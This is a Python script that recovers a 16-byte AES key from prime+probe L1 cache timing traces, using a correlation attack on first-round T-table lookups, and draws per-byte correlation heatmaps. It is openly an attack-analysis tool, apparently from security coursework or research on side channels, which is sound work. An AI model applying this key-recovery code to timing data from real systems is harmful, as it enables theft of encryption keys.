#!/usr/bin/env python3
"""
recover_key.py: Recover AES key from a prime+probe L1 cache attack on AES.

This module implements a Correlation Power Analysis (CPA) on first-round AES T-table accesses
and exposes core functions for importing and testing. It also provides a CLI via main().

Key features:
  - load_data: parse plaintexts and 64 cache-timing measurements per sample
  - recover_key_bytes: parallel CPA, returns key bytes + correlation matrices
  - generate_heatmaps: detailed heatmaps with readable tick labels
  - CLI: automatic data file discovery, optional output file, custom processes
"""
import argparse
import gzip
import os
import sys
from multiprocessing import Pool, cpu_count

import numpy as np
from tqdm import tqdm
import matplotlib.pyplot as plt
import seaborn as sns


def load_data(filename):
    """
    Load plaintexts and timing traces from a gzipped or text file.
    Each line: <pt_hex> <ct_hex> <t1> ... <t64>

    Returns:
        plaintexts (np.ndarray): shape=(nsamples,16), dtype=np.uint8
        times_arr (np.ndarray): shape=(nsamples,64), dtype=np.float32
    """
    pts, times = [], []
    opener = gzip.open if filename.endswith('.gz') else open
    with opener(filename, 'rt') as f:
        for lineno, line in enumerate(f):
            parts = line.strip().split()
            if len(parts) < 66:
                continue  # skip malformed
            pt_hex = parts[0]
            vals = list(map(int, parts[2:]))
            if len(vals) != 64:
                raise ValueError(f"Line {lineno}: expected 64 timings, got {len(vals)}")
            pts.append([int(pt_hex[i:i+2], 16) for i in range(0, 32, 2)])
            times.append(vals)
    return np.array(pts, dtype=np.uint8), np.array(times, dtype=np.float32)


def _score_key_byte(task):
    """
    Internal: compute CPA correlations for a given key byte index.

    Args:
        task: (byte_idx, plaintexts, times_arr)
    Returns:
        byte_idx, best_guess, best_score, corr_matrix
    """
    byte_idx, plaintexts, times_arr = task
    pts = plaintexts[:, byte_idx]
    table_idx = byte_idx % 4
    table_times = times_arr[:, table_idx * 16:(table_idx + 1) * 16]
    n = len(pts)

    corr_matrix = np.zeros((256, 16), dtype=np.float32)
    best_guess, best_score = 0, -np.inf

    for k in range(256):
        predicted = (np.bitwise_xor(pts, k) // 16).astype(np.int32)
        for line in range(16):
            mask = (predicted == line).astype(np.float32)
            count = mask.sum()
            if count == 0 or count == n:
                continue
            times_line = table_times[:, line]
            if np.all(times_line == times_line[0]):
                continue
            mat = np.corrcoef(mask, times_line)
            if mat.shape != (2, 2):
                continue
            corr_val = abs(mat[0, 1])
            corr_matrix[k, line] = corr_val
            if corr_val > best_score:
                best_score, best_guess = corr_val, k

    return byte_idx, best_guess, best_score, corr_matrix


def recover_key_bytes(plaintexts, times_arr, processes=None):
    """
    Recover AES key bytes via CPA on provided traces.

    Args:
        plaintexts: np.ndarray (nsamples,16)
        times_arr:  np.ndarray (nsamples,64)
        processes: optional int; number of parallel workers

    Returns:
        key_bytes: bytes length 16
        corr_matrices: dict {byte_idx: np.ndarray(256,16)}
        results: list of (byte_idx, best_guess, best_score)
    """
    if processes is None:
        processes = cpu_count()
    tasks = [(b, plaintexts, times_arr) for b in range(16)]
    corr_matrices, results = {}, []

    with Pool(processes) as pool:
        for byte_idx, guess, score, mat in tqdm(
            pool.imap_unordered(_score_key_byte, tasks),
            total=16, desc="Scoring bytes"
        ):
            corr_matrices[byte_idx] = mat
            results.append((byte_idx, guess, score))

    results.sort(key=lambda x: x[0])
    key_bytes = bytes(guess for _, guess, _ in results)
    return key_bytes, corr_matrices, results


def generate_heatmaps(corr_matrices, out_dir):
    """
    Save correlation heatmaps for each byte with readable tick labels.

    Args:
        corr_matrices: dict from recover_key_bytes
        out_dir: directory path to save PNG files
    """
    os.makedirs(out_dir, exist_ok=True)
    for byte_idx, matrix in sorted(corr_matrices.items()):
        fig, ax = plt.subplots(figsize=(10, 6))
        sns.heatmap(
            matrix,
            cmap='plasma',
            xticklabels=[f"L{l}" for l in range(16)],
            yticklabels=False,
            ax=ax
        )
        # subset y-ticks for readability
        n = matrix.shape[0]
        step = max(1, n // 16)
        ticks = list(range(0, n, step))
        ax.set_yticks([t + 0.5 for t in ticks])
        ax.set_yticklabels([f"{t:02x}" for t in ticks], rotation=0)

        ax.set_title(f"CPA Corr: Byte {byte_idx} (Tbl {byte_idx%4})")
        ax.set_xlabel('Cache Line')
        ax.set_ylabel('Key Guess (hex)')
        fig.tight_layout()
        fig.savefig(os.path.join(out_dir, f"heatmap_byte_{byte_idx}.png"))
        plt.close(fig)


def parse_args():
    parser = argparse.ArgumentParser(
        description='AES CPA key recovery via prime+probe cache timings.'
    )
    parser.add_argument('-i', '--input', type=str, default=None,
                        help='Input file path (data/output.txt or .gz)')
    parser.add_argument('-o', '--output', type=str, default=None,
                        help='Output file for recovered key (hex)')
    parser.add_argument('-d', '--heatmap-dir', type=str, default=None,
                        help='Directory for heatmaps (default: ../data/heatmaps)')
    parser.add_argument('-p', '--processes', type=int, default=cpu_count(),
                        help='Number of processes (default: all cores)')
    return parser.parse_args()


def main():
    args = parse_args()
    script_dir = os.path.dirname(os.path.abspath(__file__))
    project_root = os.path.abspath(os.path.join(script_dir, '..'))
    data_dir = os.path.join(project_root, 'data')

    # discover input file
    if args.input and os.path.exists(args.input):
        infile = args.input
    else:
        for name in ('output.txt', 'output.txt.gz'):
            path = os.path.join(data_dir, name)
            if os.path.exists(path):
                infile = path
                break
        else:
            print("Error: no output.txt(.gz) in data/", file=sys.stderr)
            sys.exit(1)

    # determine heatmap directory
    heat_dir = args.heatmap_dir or os.path.join(data_dir, 'heatmaps')

    print(f"Loading data from: {infile}")
    pts, times_arr = load_data(infile)
    print(f"Loaded {pts.shape[0]} samples.")

    key_bytes, corr_matrices, results = recover_key_bytes(
        pts, times_arr, processes=args.processes)
    key_hex = key_bytes.hex()
    print(f"Recovered AES key: {key_hex}")

    if args.output:
        with open(args.output, 'w') as f:
            f.write(key_hex)
        print(f"Key written to: {args.output}")

    print(f"Generating heatmaps in: {heat_dir}")
    generate_heatmaps(corr_matrices, heat_dir)
    print("Done.")

if __name__ == '__main__':
    main()
